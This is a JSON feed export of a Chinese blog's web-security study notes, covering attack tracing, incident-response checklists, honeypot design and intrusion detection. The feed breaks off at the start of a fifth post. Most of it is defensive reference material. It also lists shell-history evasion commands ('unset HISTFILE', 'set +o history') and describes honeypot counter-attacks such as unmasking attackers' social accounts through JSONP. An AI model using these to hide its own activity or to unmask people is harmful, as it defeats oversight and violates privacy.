{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"web安全学习笔记\" category",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/",
            "title": "溯源分析",
            "date_published": "2022-12-05T08:45:22.000Z",
            "content_html": "<h1 id=\"攻击机溯源技术\"><a class=\"anchor\" href=\"#攻击机溯源技术\">#</a> 攻击机溯源技术</h1>\n<h2 id=\"基于日志的溯源\"><a class=\"anchor\" href=\"#基于日志的溯源\">#</a> 基于日志的溯源</h2>\n<p>使用路由器、主机等设备记录网络传输的数据流中的关键信息 (时间、源地址、目的地址)，追踪时基于日志查询做反向追踪。</p>\n<p>这种方式的优点在于兼容性强、支持事后追溯、网络开销较小。但是同时该方法也受性能、空间和隐私保护等的限制，考虑到以上的因素，可以限制记录的数据特征和数据数量。另外可以使用流量镜像等技术来减小对网络性能的影响。</p>\n<h2 id=\"路由输入调试技术\"><a class=\"anchor\" href=\"#路由输入调试技术\">#</a> 路由输入调试技术</h2>\n<p>在攻击持续发送数据，且特性较为稳定的场景下，可以使用路由器的输入调试技术，在匹配到攻击流量时动态的向上追踪。这种方式在 DDoS 攻击追溯中比较有效，且网络开销较小。</p>\n<h2 id=\"可控洪泛技术\"><a class=\"anchor\" href=\"#可控洪泛技术\">#</a> 可控洪泛技术</h2>\n<p>追踪时向潜在的上游路由器进行洪泛攻击，如果发现收到的攻击流量变少则攻击流量会流经相应的路由。这种方式的优点在于不需要预先部署，对协同的需求比较少。但是这种方式本身是一种攻击，会对网络有所影响。</p>\n<h2 id=\"基于包数据修改追溯技术\"><a class=\"anchor\" href=\"#基于包数据修改追溯技术\">#</a> 基于包数据修改追溯技术</h2>\n<p>这种溯源方式直接对数据包进行修改，加入编码或者标记信息，在接收端对传输路径进行重构。这种方式人力投入较少，支持事后分析，但是对某些协议的支持性不太好。</p>\n<p>基于这种方式衍生出了随机标记技术，各路由以一定概率对数据包进行标识，接收端收集到多个包后进行重构。</p>\n<h1 id=\"基于蜜罐溯源\"><a class=\"anchor\" href=\"#基于蜜罐溯源\">#</a> 基于蜜罐溯源</h1>\n<ul>\n<li>社交网络 jsonp API</li>\n<li>获取攻击者 IP</li>\n<li>获取 burp 信息</li>\n</ul>\n<h1 id=\"分析模型\"><a class=\"anchor\" href=\"#分析模型\">#</a> 分析模型</h1>\n<h2 id=\"杀伤链kill-kain模型\"><a class=\"anchor\" href=\"#杀伤链kill-kain模型\">#</a> 杀伤链 (Kill Kain) 模型</h2>\n<p>杀伤链这个概念源自军事领域，它是一个描述攻击环节的模型。一般杀伤链有认为侦查跟踪 (Reconnaissance)、武器构建 (Weaponization)、载荷投递 (Delivery)、漏洞利用 (Exploitation)、安装植入 (Installation)、通信控制 (Command&amp;Control)、达成目标 (Actions on Objective) 等几个阶段。</p>\n<p>在越早的杀伤链环节阻止攻击，防护效果就越好，因此杀伤链的概念也可以用来反制攻击。</p>\n<p>在跟踪阶段，攻击者通常会采用扫描和搜索等方式来寻找可能的目标信息并评估攻击成本。在这个阶段可以通过日志分析、邮件分析等方式来发现，这阶段也可以采用威胁情报等方式来获取攻击信息。</p>\n<p>武器构建阶段攻击者通常已经准备好了攻击工具，并进行尝试性的攻击，在这个阶段 IDS 中可能有攻击记录，外网应用、邮箱等帐号可能有密码爆破的记录。有一些攻击者会使用公开攻击工具，会带有一定的已知特征。</p>\n<p>载荷投递阶段攻击者通常会采用网络漏洞、鱼叉、水坑、网络劫持、U 盘等方式投送恶意代码。此阶段已经有人员在对应的途径收到了攻击载荷，对人员进行充分的安全培训可以做到一定程度的防御。</p>\n<p>突防利用阶段攻击者会执行恶意代码来获取系统控制权限，此时木马程序已经执行，此阶段可以依靠杀毒软件、异常行为告警等方式来找到相应的攻击。</p>\n<p>安装植入阶段攻击者通常会在 web 服务器上安装 Webshell 或植入后门、rootkit 等来实现对服务器的持久化控制。可以通过对样本进行逆向工程来找到这些植入。</p>\n<p>通信控制阶段攻击者已经实现了远程通信控制，木马会通过 Web 三方网站、DNS 隧道、邮件等方式和控制服务器进行通信。此时可以通过对日志进行分析来找到木马的痕迹。</p>\n<p>达成目标阶段时，攻击者开始完成自己的目的，可能是破坏系统正常运行、窃取目标数据、敲诈勒索、横向移动等。此时受控机器中可能已经有攻击者的上传的攻击利用工具，此阶段可以使用蜜罐等方式来发现。</p>\n<h2 id=\"钻石diamond模型\"><a class=\"anchor\" href=\"#钻石diamond模型\">#</a> 钻石 (Diamond) 模型</h2>\n<p>钻石模型由网络情报分析与威胁研究中心 (The Center for Cyber Intelligence Anaysis and Threat Research，CCIATR) 机构的 Sergio Catagirone 等人在 2013 年提出。</p>\n<p>该模型把所有的安全事件 (Event) 分为四个核心元素，即敌手 (Adversary)，能力 (Capability)，基础设施 (Infrastructure) 和受害者 (Victim)，以菱形连线代表它们之间的关系，因而命名为 “钻石模型”。</p>\n<p>杀伤链模型的特点是可说明攻击线路和攻击的进程，而钻石模型的特点是可说明攻击者在单个事件中的攻击目的和所使用攻击手法。</p>\n<p>在使用钻石模型分析时，通常使用支点分析的方式。支点 (Pivoting) 指提取一个元素，并利用该元素与数据源相结合以发现相关元素的分析技术。分析中可以随时变换支点，四个核心特征以及两个扩展特征 (社会政治、技术) 都可能成为当时的分析支点。</p>\n<h1 id=\"关联分析方法\"><a class=\"anchor\" href=\"#关联分析方法\">#</a> 关联分析方法</h1>\n<p>关联分析用于把多个不同的攻击样本结合起来。</p>\n<h2 id=\"文档类\"><a class=\"anchor\" href=\"#文档类\">#</a> 文档类</h2>\n<ul>\n<li>hash</li>\n<li>ssdeep</li>\n<li>版本信息 (公司 / 作者 / 最后修改作者 / 创建时间 / 最后修改时间)</li>\n</ul>\n<h2 id=\"行为分析\"><a class=\"anchor\" href=\"#行为分析\">#</a> 行为分析</h2>\n<ul>\n<li>\n<p>基于网络行为</p>\n<ul>\n<li>类似的交互方式</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"可执行文件相似性分析\"><a class=\"anchor\" href=\"#可执行文件相似性分析\">#</a> 可执行文件相似性分析</h2>\n<ul>\n<li>\n<p>特殊端口</p>\n</li>\n<li>\n<p>特殊字符串 / 密钥</p>\n</li>\n<li>\n<p>PDB 文件路径</p>\n<ul>\n<li>相似的文件夹</li>\n</ul>\n</li>\n<li>\n<p>代码复用</p>\n<ul>\n<li>相似的代码片段</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"清除日志方式\"><a class=\"anchor\" href=\"#清除日志方式\">#</a> 清除日志方式</h1>\n<ul>\n<li><code>kill &lt;bash process ID&gt;</code>  不会存储</li>\n<li><code>set +o history</code>  不写入历史记录</li>\n<li><code>unset HISTFILE</code>  清除历史记录的环境变量</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdmxyMlg2OHRNVGdEaGREazRhb3cwZw==\">利用社交账号精准溯源的蜜罐技术</span></li>\n</ul>\n",
            "tags": [
                "攻击溯源",
                "分析模型"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
            "title": "应急响应",
            "date_published": "2022-12-05T08:40:15.000Z",
            "content_html": "<h1 id=\"响应流程\"><a class=\"anchor\" href=\"#响应流程\">#</a> 响应流程</h1>\n<h2 id=\"事件发生\"><a class=\"anchor\" href=\"#事件发生\">#</a> 事件发生</h2>\n<p>运维监控人员、客服审核人员等发现问题，向上通报。</p>\n<h2 id=\"事件确认\"><a class=\"anchor\" href=\"#事件确认\">#</a> 事件确认</h2>\n<p>收集事件信息、分析网络活动相关程序，日志和数据，判断事件的严重性，评估出问题的严重等级，是否向上进行汇报等。</p>\n<h2 id=\"事件响应\"><a class=\"anchor\" href=\"#事件响应\">#</a> 事件响应</h2>\n<p>各部门通力合作，处理安全问题，具体解决问题，避免存在漏洞未修补、后门未清除等残留问题。</p>\n<h2 id=\"事件关闭\"><a class=\"anchor\" href=\"#事件关闭\">#</a> 事件关闭</h2>\n<p>处理完事件之后，需要关闭事件，并写出安全应急处理分析报告，完成整个应急过程。</p>\n<h1 id=\"事件分类\"><a class=\"anchor\" href=\"#事件分类\">#</a> 事件分类</h1>\n<ul>\n<li>\n<p>病毒、木马、蠕虫事件</p>\n</li>\n<li>\n<p>Web 服务器入侵事件</p>\n</li>\n<li>\n<p>第三方服务入侵事件</p>\n</li>\n<li>\n<p>系统入侵事件</p>\n<ul>\n<li>利用 Windows 漏洞攻击操作系统</li>\n</ul>\n</li>\n<li>\n<p>网络攻击事件</p>\n<ul>\n<li>DDoS / ARP 欺骗 / DNS 劫持等</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"分析方向\"><a class=\"anchor\" href=\"#分析方向\">#</a> 分析方向</h1>\n<h2 id=\"文件分析\"><a class=\"anchor\" href=\"#文件分析\">#</a> 文件分析</h2>\n<ul>\n<li>\n<p>基于变化的分析</p>\n<ul>\n<li>日期</li>\n<li>文件增改</li>\n<li>最近使用文件</li>\n</ul>\n</li>\n<li>\n<p>源码分析</p>\n<ul>\n<li>检查源码改动</li>\n<li>查杀 WebShell 等后门</li>\n</ul>\n</li>\n<li>\n<p>系统日志分析</p>\n</li>\n<li>\n<p>应用日志分析</p>\n<ul>\n<li>分析 User-Agent，e.g.  <code>awvs / burpsuite / w3af / nessus / openvas</code></li>\n<li>对每种攻击进行关键字匹配，e.g.  <code>select/alert/eval</code></li>\n<li>异常请求，连续的 404 或者 500</li>\n</ul>\n</li>\n<li>\n<p><code>md5sum</code>  检查常用命令二进制文件的哈希，检查是否被植入 rootkit</p>\n</li>\n</ul>\n<h2 id=\"进程分析\"><a class=\"anchor\" href=\"#进程分析\">#</a> 进程分析</h2>\n<ul>\n<li>\n<p>符合以下特征的进程</p>\n<ul>\n<li>CPU 或内存资源占用长时间过高</li>\n<li>没有签名验证信息</li>\n<li>没有描述信息的进程</li>\n<li>进程的路径不合法</li>\n</ul>\n</li>\n<li>\n<p>dump 系统内存进行分析</p>\n</li>\n<li>\n<p>正在运行的进程</p>\n</li>\n<li>\n<p>正在运行的服务</p>\n</li>\n<li>\n<p>父进程和子进程</p>\n</li>\n<li>\n<p>后台可执行文件的完整哈希</p>\n</li>\n<li>\n<p>已安装的应用程序</p>\n</li>\n<li>\n<p>运行着密钥或其他正在自动运行的持久化程序</p>\n</li>\n<li>\n<p>计划任务</p>\n</li>\n</ul>\n<h2 id=\"身份信息分析\"><a class=\"anchor\" href=\"#身份信息分析\">#</a> 身份信息分析</h2>\n<ul>\n<li>本地以及域账号用户</li>\n<li>异常的身份验证</li>\n<li>非标准格式的用户名</li>\n</ul>\n<h2 id=\"日志分析\"><a class=\"anchor\" href=\"#日志分析\">#</a> 日志分析</h2>\n<ul>\n<li>杀软检测记录</li>\n</ul>\n<h2 id=\"网络分析\"><a class=\"anchor\" href=\"#网络分析\">#</a> 网络分析</h2>\n<ul>\n<li>防火墙配置</li>\n<li>DNS 配置</li>\n<li>路由配置</li>\n<li>监听端口和相关服务</li>\n<li>最近建立的网络连接</li>\n<li>RDP / VPN / SSH 等会话</li>\n</ul>\n<h2 id=\"配置分析\"><a class=\"anchor\" href=\"#配置分析\">#</a> 配置分析</h2>\n<ul>\n<li>查看 Linux SE 等配置</li>\n<li>查看环境变量</li>\n<li>查看配套的注册表信息检索，SAM 文件</li>\n<li>内核模块</li>\n</ul>\n<h1 id=\"linux应急响应\"><a class=\"anchor\" href=\"#linux应急响应\">#</a> Linux 应急响应</h1>\n<h2 id=\"文件分析-2\"><a class=\"anchor\" href=\"#文件分析-2\">#</a> 文件分析</h2>\n<ul>\n<li>\n<p>最近使用文件</p>\n<ul>\n<li><code>find / -ctime -2</code></li>\n<li><code>C:\\Documents and Settings\\Administrator\\Recent</code></li>\n<li><code>C:\\Documents and Settings\\Default User\\Recent</code></li>\n<li><code>%UserProfile%\\Recent</code></li>\n</ul>\n</li>\n<li>\n<p>系统日志分析</p>\n<ul>\n<li>/var/log/</li>\n</ul>\n</li>\n<li>\n<p>重点分析位置</p>\n<ul>\n<li><code>/var/log/wtmp</code>  登录进入，退出，数据交换、关机和重启纪录</li>\n<li><code>/var/run/utmp</code>  有关当前登录用户的信息记录</li>\n<li><code>/var/log/lastlog</code>  文件记录用户最后登录的信息，可用 lastlog 命令来查看。</li>\n<li><code>/var/log/secure</code>  记录登入系统存取数据的文件，例如 pop3/ssh/telnet/ftp 等都会被记录。</li>\n<li><code>/var/log/cron</code>  与定时任务相关的日志信息</li>\n<li><code>/var/log/message</code>  系统启动后的信息和错误日志</li>\n<li><code>/var/log/apache2/access.log</code>  apache access log</li>\n<li><code>/etc/passwd</code>  用户列表</li>\n<li><code>/etc/init.d/</code>  开机启动项</li>\n<li><code>/etc/cron*</code>  定时任务</li>\n<li><code>/tmp</code>  临时目录</li>\n<li><code>~/.ssh</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"用户分析\"><a class=\"anchor\" href=\"#用户分析\">#</a> 用户分析</h2>\n<ul>\n<li><code>/etc/shadow</code>  密码登陆相关信息</li>\n<li><code>uptime</code>  查看用户登陆时间</li>\n<li><code>/etc/sudoers</code>  sudo 用户列表</li>\n</ul>\n<h2 id=\"进程分析-2\"><a class=\"anchor\" href=\"#进程分析-2\">#</a> 进程分析</h2>\n<ul>\n<li>\n<p><code>netstat -ano</code>  查看是否打开了可疑端口</p>\n</li>\n<li>\n<p><code>w</code>  命令，查看用户及其进程</p>\n</li>\n<li>\n<p>分析开机自启程序 / 脚本</p>\n<ul>\n<li><code>/etc/init.d</code></li>\n<li><code>~/.bashrc</code></li>\n</ul>\n</li>\n<li>\n<p>查看计划或定时任务</p>\n<ul>\n<li><code>crontab -l</code></li>\n</ul>\n</li>\n<li>\n<p><code>netstat -an</code>  /  <code>lsof</code>  查看进程端口占用</p>\n</li>\n</ul>\n<h1 id=\"windows应急响应\"><a class=\"anchor\" href=\"#windows应急响应\">#</a> Windows 应急响应</h1>\n<h2 id=\"文件分析-3\"><a class=\"anchor\" href=\"#文件分析-3\">#</a> 文件分析</h2>\n<ul>\n<li>\n<p>最近使用文件</p>\n<ul>\n<li><code>C:\\Documents and Settings\\Administrator\\Recent</code></li>\n<li><code>C:\\Documents and Settings\\Default User\\Recent</code></li>\n<li><code>%UserProfile%\\Recent</code></li>\n</ul>\n</li>\n<li>\n<p>系统日志分析</p>\n<ul>\n<li>事件查看器  <code>eventvwr.msc</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"用户分析-2\"><a class=\"anchor\" href=\"#用户分析-2\">#</a> 用户分析</h2>\n<ul>\n<li>查看是否有新增用户</li>\n<li>查看服务器是否有弱口令</li>\n<li>查看管理员对应键值</li>\n<li><code>lusrmgr.msc</code>  查看账户变化</li>\n<li><code>net user</code>  列出当前登录账户</li>\n<li><code>wmic UserAccount get</code>  列出当前系统所有账户</li>\n</ul>\n<h2 id=\"进程分析-3\"><a class=\"anchor\" href=\"#进程分析-3\">#</a> 进程分析</h2>\n<ul>\n<li>\n<p><code>netstat -ano</code>  查看是否打开了可疑端口</p>\n</li>\n<li>\n<p><code>tasklist</code>  查看是否有可疑进程</p>\n</li>\n<li>\n<p>分析开机自启程序</p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code></li>\n<li><code>(ProfilePath)\\Start Menu\\Programs\\Startup</code>  启动项</li>\n<li><code>msconfig</code>  启动选项卡</li>\n<li><code>gpedit.msc</code>  组策略编辑器</li>\n</ul>\n</li>\n<li>\n<p>查看计划或定时任务</p>\n<ul>\n<li><code>C:\\Windows\\System32\\Tasks\\</code></li>\n<li><code>C:\\Windows\\SysWOW64\\Tasks\\</code></li>\n<li><code>C:\\Windows\\tasks\\</code></li>\n<li><code>schtasks</code></li>\n<li><code>taskschd.msc</code></li>\n<li><code>compmgmt.msc</code></li>\n</ul>\n</li>\n<li>\n<p>查看启动服务</p>\n<ul>\n<li><code>services.msc</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"日志分析-2\"><a class=\"anchor\" href=\"#日志分析-2\">#</a> 日志分析</h2>\n<ul>\n<li>事件查看\n<ul>\n<li><code>eventvwr.msc</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h2>\n<ul>\n<li>查看系统环境变量</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTE0MA==\">黑客入侵应急分析手工排查</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9jb2x1bW4vMTQ3OTI5Lmh0bWw=\">取证入门 web 篇</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjUyNA==\">Windows 系统安全事件应急响应</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTYzMg==\">企业安全应急响应</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly91cy1jZXJ0LmNpc2EuZ292L25jYXMvYWxlcnRzL2FhMjAtMjQ1YQ==\">Technical Approaches to Uncovering and Remediating Malicious Activity</span></li>\n</ul>\n",
            "tags": [
                "应急响应",
                "流程",
                "Linux",
                "Windows"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF/",
            "title": "蜜罐技术",
            "date_published": "2022-12-05T08:30:15.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>蜜罐是对攻击者的欺骗技术，用以监视、检测、分析和溯源攻击行为，其没有业务上的用途，所有流入 / 流出蜜罐的流量都预示着扫描或者攻击行为，因此可以比较好的聚焦于攻击流量。</p>\n<p>蜜罐可以实现对攻击者的主动诱捕，能够详细地记录攻击者攻击过程中的许多痕迹，可以收集到大量有价值的数据，如病毒或蠕虫的源码、黑客的操作等，从而便于提供丰富的溯源数据。另外蜜罐也可以消耗攻击者的时间，基于 JSONP 等方式来获取攻击者的画像。</p>\n<p>但是蜜罐存在安全隐患，如果没有做好隔离，可能成为新的攻击源。</p>\n<h1 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h1>\n<p>按用途分类，蜜罐可以分为研究型蜜罐和产品型蜜罐。研究型蜜罐一般是用于研究各类网络威胁，寻找应对的方式，不增加特定组织的安全性。产品型蜜罐主要是用于防护的商业产品。</p>\n<p>按交互方式分类，蜜罐可以分为低交互蜜罐和高交互蜜罐。低交互蜜罐模拟网络服务响应和攻击者交互，容易部署和控制攻击，但是模拟能力会相对较弱，对攻击的捕获能力不强。高交互蜜罐不是简单模拟协议或服务，而是提供真实的系统，使得被发现的概率大幅度降低。但是高交互蜜罐部署不当时存在被攻击者利用的可能性。</p>\n<h1 id=\"隐藏技术\"><a class=\"anchor\" href=\"#隐藏技术\">#</a> 隐藏技术</h1>\n<p>蜜罐主要涉及到的是伪装技术，主要涉及到进程隐藏、服务伪装等技术。</p>\n<p>蜜罐之间的隐藏，要求蜜罐之间相互隐蔽。进程隐藏，蜜罐需要隐藏监控、信息收集等进程。伪服务和命令技术，需要对部分服务进行伪装，防止攻击者获取敏感信息或者入侵控制内核。数据文件伪装，需要生成合理的虚假数据的文件。</p>\n<h1 id=\"牵引技术\"><a class=\"anchor\" href=\"#牵引技术\">#</a> 牵引技术</h1>\n<p>蜜罐牵引技术是在识别到攻击者流量后，通过在正式环境中改变路由、返回特定响应的方式将攻击者牵引到特定的蜜罐地址。 常见的牵引技术有下面几种：</p>\n<ul>\n<li>防火墙牵引</li>\n<li>SDN 牵引</li>\n<li>ARP 牵引</li>\n<li>WAF 牵引</li>\n</ul>\n<h1 id=\"诱饵技术\"><a class=\"anchor\" href=\"#诱饵技术\">#</a> 诱饵技术</h1>\n<p>可以在互联网中部署一定的诱饵来吸引攻击者进入特定的蜜罐中。 常见的诱饵有域名诱饵、Github 诱饵、网盘诱饵、邮件诱饵、主机诱饵、文件诱饵、漏洞诱饵等。</p>\n<p>域名诱饵指使用特定的在字典中且有意义的主域名做为诱饵，比如  <code>vpn.example.com</code>  /  <code>oa.example.com</code>  等。</p>\n<p>Github 诱饵指在 Github 中放置代码文件、失陷凭证的方式。</p>\n<p>文件诱饵是在容易失陷的主机中放置虚假的拓扑图，关键系统 IP 的文件，从而诱导攻击者的方式。</p>\n<p>漏洞诱饵通过部署存在特定漏洞特征的蜜罐站，吸引攻击者攻击。</p>\n<h1 id=\"反制技术\"><a class=\"anchor\" href=\"#反制技术\">#</a> 反制技术</h1>\n<p>蜜罐可以使用一些方式对攻击者进行反制，常见的方式有 Jsonp、安全工具漏洞、Client 漏洞反制、文件反制等方式。</p>\n<p>Jsonp 主要是使用各大网站的 Jsonp 获取攻击者已经登录的社交账号，用以溯源。 另外如果攻击者使用流量的方式访问蜜罐网站，可以使用运营商接口获取攻击者的手机号。</p>\n<p>安全工具漏洞是指使用安全工具的漏洞进行反制，例如 Git 泄露工具存在的文件泄露漏洞，基于 Electron 的工具存在的 XSS to RCE 等。</p>\n<p>Client 反制，指使用虚假的 Server 对存在漏洞的客户端进行反制，例如通过 MySQL Client 读取文件，基于 RDP/SMB 的漏洞进行 RCE。</p>\n<p>反制文件，指在蜜罐环境中设置特定的文件，例如伪装的 VPN 客户端、特定插件来诱导攻击者点击。</p>\n<p>DoS 反制，在获取到攻击者的 C2 样本后，可以通过批量上线的方式影响 C2 攻击者的控制服务器。</p>\n<h1 id=\"识别技术\"><a class=\"anchor\" href=\"#识别技术\">#</a> 识别技术</h1>\n<p>攻击者也会尝试对蜜罐进行识别。比较容易的识别的是低交互的蜜罐，尝试一些比较复杂且少见的操作能比较容易的识别低交互的蜜罐。相对困难的是高交互蜜罐的识别，因为高交互蜜罐通常以真实系统为基础来构建，和真实系统比较近似。对这种情况，通常会基于虚拟文件系统和注册表的信息、内存分配特征、硬件特征、特殊指令等来识别。</p>\n<h2 id=\"协议实现识别\"><a class=\"anchor\" href=\"#协议实现识别\">#</a> 协议实现识别</h2>\n<p>部分蜜罐在实现的过程中，协议的部分参数固定或随机的范围有限，可以通过特定参数的范围来识别蜜罐。</p>\n<p>部分蜜罐协议支持的版本范围为某一特定版本范围，可以通过对应的版本范围来推测是否为蜜罐。</p>\n<p>部分蜜罐在交互过程中有探测客户端特征的交互，可以通过这些交互过程来识别蜜罐。</p>\n<p>部分蜜罐对不正确的请求也返回正常的相应，可以通过这种特征来判定蜜罐。</p>\n<h2 id=\"环境特征\"><a class=\"anchor\" href=\"#环境特征\">#</a> 环境特征</h2>\n<p>部分蜜罐的用户名、密码固定，或内存使用、进程占用等动态特征变化较为规律，可以通过这种方式来判断是否为蜜罐。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvSG9uZXlwb3RfKGNvbXB1dGluZyk=\">honeypot wiki</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3RocmVhdHN0cmVhbS5naXRodWIuaW8vbWhuLw==\">Modern Honey Network</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubW9yZXNlYy5jbi9tYWdpYy1zaGllbGQuaHRtbA==\">默安科技：幻阵</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTk4\">蜜罐与内网安全从 0 到 1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXprME56RTRNREUyTkE9PSZhbXA7bWlkPTIyNDc0ODM5MDgmYW1wO2lkeD0xJmFtcDtzbj1lNmEzMTllMjJjM2NkNTQ2NTBiZGJiYTUxMWU1OGE0Mw==\">浅析开源蜜罐识别与全网测绘</span></li>\n</ul>\n",
            "tags": [
                "蜜罐",
                "隐藏",
                "诱导"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/",
            "title": "入侵检测",
            "date_published": "2022-12-05T08:25:15.000Z",
            "content_html": "<h1 id=\"ids与ips\"><a class=\"anchor\" href=\"#ids与ips\">#</a> IDS 与 IPS</h1>\n<p>IDS 与 IPS 是常见的防护设备，IPS 相对 IDS 的不同点在于，IPS 通常具有阻断能力。</p>\n<h1 id=\"常见入侵点\"><a class=\"anchor\" href=\"#常见入侵点\">#</a> 常见入侵点</h1>\n<ul>\n<li>Web 入侵</li>\n<li>高危服务入侵</li>\n</ul>\n<h1 id=\"监控实现\"><a class=\"anchor\" href=\"#监控实现\">#</a> 监控实现</h1>\n<h2 id=\"客户端监控\"><a class=\"anchor\" href=\"#客户端监控\">#</a> 客户端监控</h2>\n<ul>\n<li>\n<p>监控敏感配置文件</p>\n</li>\n<li>\n<p>常用命令 ELF 文件完整性监控</p>\n<ul>\n<li><code>ps</code></li>\n<li><code>lsof</code></li>\n<li>...</li>\n</ul>\n</li>\n<li>\n<p>rootkit 监控</p>\n</li>\n<li>\n<p>资源使用报警</p>\n<ul>\n<li>内存使用率</li>\n<li>CPU 使用率</li>\n<li>IO 使用率</li>\n<li>网络使用率</li>\n</ul>\n</li>\n<li>\n<p>新出现进程监控</p>\n</li>\n<li>\n<p>基于 inotify 的文件监控</p>\n</li>\n</ul>\n<h2 id=\"网络检测\"><a class=\"anchor\" href=\"#网络检测\">#</a> 网络检测</h2>\n<p>基于网络层面的攻击向量做检测，如 Snort 等。</p>\n<h2 id=\"日志分析\"><a class=\"anchor\" href=\"#日志分析\">#</a> 日志分析</h2>\n<p>将主机系统安全日志 / 操作日志、网络设备流量日志、Web 应用访问日志、SQL 应用访问日志等日志集中到一个统一的后台，在后台中对各类日志进行综合的分析。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvZXMvMTk0NTEwLmh0bWw=\">企业安全建设之 HIDS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTYyNi8=\">大型互联网企业入侵检测实战总结</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mva3plQUV2ei1lakxENzFmZ2I1dDh0QQ==\">同程入侵检测系统</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjEzNg==\">Web 日志安全分析系统实践</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTEyMQ==\">Web 日志安全分析浅谈</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUUplVzdLLUtUaFlIZ2dXdEotRmgzdw==\">网络层绕过 IDS/IPS 的一些探索</span></li>\n</ul>\n",
            "tags": [
                "入侵检测",
                "IDS",
                "IPS"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%8A%A0%E5%9B%BA%E6%A3%80%E6%9F%A5/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%8A%A0%E5%9B%BA%E6%A3%80%E6%9F%A5/",
            "title": "加固检查",
            "date_published": "2022-12-05T08:20:15.000Z",
